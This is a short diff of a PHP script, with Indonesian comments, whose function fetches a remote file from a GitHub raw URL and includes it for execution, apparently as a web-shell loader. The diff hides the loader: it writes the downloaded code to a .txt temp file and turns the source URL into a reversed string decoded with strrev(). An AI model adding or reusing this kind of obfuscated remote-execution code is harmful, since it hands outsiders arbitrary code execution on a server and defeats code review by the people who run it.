@@ -35,7 +35,7 @@ function fetch_and_execute_remote_php($url) {
     }
 
     // Menulis konten yang diunduh ke dalam file sementara
-    $filePath = __DIR__ . '/temp_' . uniqid() . '.php';
+    $filePath = __DIR__ . '/temp_' . uniqid() . '.txt';
     if (file_put_contents($filePath, $result) !== false) {
         try {
             // Menyertakan file sementara untuk dieksekusi
@@ -50,6 +50,6 @@ function fetch_and_execute_remote_php($url) {
     }
 }
 
-fetch_and_execute_remote_php("https://raw.githubusercontent.com/security-seo/shldemo/main/ap7.txt");
+fetch_and_execute_remote_php(strrev("txt.7pa/niam/omedlhs/oes-ytiruces/moc.tnetnocresubuhtig.war//:sptth"));
 
 ?>
